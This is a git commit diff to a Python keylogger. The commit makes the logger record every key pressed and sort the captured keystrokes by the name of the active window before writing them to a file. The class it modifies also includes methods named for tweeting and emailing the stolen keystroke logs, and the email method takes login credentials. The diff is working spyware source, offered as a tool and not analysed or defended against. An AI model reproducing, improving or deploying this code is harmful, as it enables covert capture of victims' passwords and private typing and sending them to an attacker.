751228d43d91aa74e1e317ba0bfc19205fd67374
tyamlak <tyamlak@gmail.com>
2021-03-24 17:50:53 +0300

    log now contains corresponding windows name

--- keylogger.py
+++ keylogger.py
@@ -16,6 +16,7 @@ class KeyLogger:
         self.timer = Thread(target=self.schedule_log,args=())
         self.timer.daemon = True
         self.time_interval = time_interval * 60
+        self.keylog_data = []
         if log_method == 1:
             self.log_method = self.log_to_file
             self.log_file = open(log_file,'w')
@@ -27,18 +28,24 @@ class KeyLogger:
     def schedule_log(self):
         while True:
             time.sleep(self.time_interval)
-            self.log_method()
+            self.log()
+
+    def repr_keystroke(self,event):
+        if event.Ascii in range(32,127):
+            return chr(event.Ascii)
+        else:
+            return f' [{event.Key}] '
 
     def ListenKeyboard(self,event):
         if event.Key == 'Escape':
             print("Writing logs and quitting...")
-            self.log_method()
+            self.log()
             exit(0)
-        if event.Ascii in range(32,127):
-            if event.MessageName == 'key down':
+        if event.MessageName == 'key down':
+            self.keylog_data.append(event)
+            if event.Ascii in range(32,127):
                 self.key_strokes += chr(event.Ascii)
-        else:
-            if event.MessageName == 'key down':
+            else:
                 self.key_strokes += f' [{event.Key}] '
 
         return True
@@ -54,16 +61,32 @@ class KeyLogger:
         print("Keylogger started.") # logging
         pythoncom.PumpMessages()
 
-    def log_to_file(self):
-        self.log_file.write(self.key_strokes)
-        self.log_file.flush()
-        self.key_strokes = ""
+    def log(self,event=None):
+        try:
+            self.log_method(event=event)
+        except Exception as e:
+            print('Error occured: ',e) # logging
+            print("Clearing log data...")
+            self.keylog_data = []
 
-    def tweet_log(self):
+    def log_to_file(self,event=None,*args,**kwargs):
+        log_info = {}
+        for event in self.keylog_data:
+            key_stroke = self.repr_keystroke(event)
+            if not event.WindowName in log_info:
+                log_info[f'{event.WindowName}'] = key_stroke
+            else:
+                log_info[f'{event.WindowName}'] += key_stroke
+        for keys in log_info:
+            self.log_file.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
+            self.log_file.flush()
+
+
+    def tweet_log(self,*args,**kwargs):
         print("Tweeting keylogs: ",self.key_strokes)
         self.key_strokes = ""
 
-    def email_log(self,login_cred=None):
+    def email_log(self,login_cred=None,*args,**kwargs):
         email = None
         password = None
         print("Sending email logs...")
